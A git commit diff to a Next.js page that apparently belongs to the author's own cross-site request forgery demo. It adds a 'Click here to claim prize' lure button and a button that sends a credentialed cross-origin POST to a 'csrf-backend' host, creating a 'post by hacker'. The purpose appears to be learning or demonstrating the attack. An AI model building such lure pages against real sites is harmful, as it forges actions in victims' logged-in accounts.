1ddfd252963c3cda92d44a2b8239eaf3fb0a8839
sumitdoescode <sumit.does.code@gmail.com>
2026-03-13 23:23:57 +0530

    l

--- app/page.tsx
+++ app/page.tsx
@@ -15,13 +15,33 @@ const page = () => {
         }
     };
 
-    useEffect(() => {
-        logout();
-    }, []);
+    const createPost = async () => {
+        try {
+            const { data } = await axios.post(
+                "https://csrf-backend.sumitdoescode.me/api/posts",
+                {
+                    title: "post by hacker",
+                    description: "description of post by hacker",
+                },
+                {
+                    withCredentials: true,
+                },
+            );
+            console.log(data);
+        } catch (error: any) {
+            console.log(error.response.data);
+        }
+    };
 
     return (
         <div>
             <h1>Hey there!!</h1>
+            <button onClick={logout} className="bg-black text-white p-2 rounded-md">
+                Click here to claim prize
+            </button>
+            <button onClick={createPost} className="bg-black text-white p-2 rounded-md">
+                Create Post
+            </button>
         </div>
     );
 };
